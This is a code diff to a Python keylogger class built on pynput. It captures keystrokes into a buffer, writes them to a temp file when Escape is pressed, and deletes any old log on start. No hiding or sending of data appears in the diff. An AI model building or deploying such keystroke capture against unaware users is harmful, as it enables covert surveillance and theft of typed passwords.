@@ -1,4 +1,5 @@
 import pynput.keyboard
+from os import path, remove
 
 
 def convert_key(key):
@@ -9,7 +10,9 @@ def convert_key(key):
 
 
 class KeyIntercept:
-    def __init__(self,temp_file, buffer_size):
+    def __init__(self, temp_file, buffer_size):
+        if path.exists(temp_file):
+            remove(temp_file)
         self.list_chars = []
         self.temp_file = temp_file
         self.buffer_size = buffer_size
@@ -17,7 +20,7 @@ class KeyIntercept:
     def __capture_key__(self, key):
         key_converted = convert_key(key)
         if key_converted == "Key.esc":
-            # TODO
+            self.__write__file__()
             return False
         elif key_converted == "Key.enter":
             self.list_chars.append("\n")
@@ -26,13 +29,14 @@ class KeyIntercept:
         elif key_converted.startswith("Key."):
             pass
         else:
-            self.list_chars.append(key_converted)
+            clear_char = key_converted.replace("'", "")
+            self.list_chars.append(clear_char)
 
     def init_loop(self):
         with pynput.keyboard.Listener(on_press=self.__capture_key__) as listen:
             listen.join()
 
-    def add_to_list(self, char):
+    def add_to_list(self, char, force=False):
         if len(self.list_chars) < self.buffer_size:
             self.list_chars.append(char)
         else:
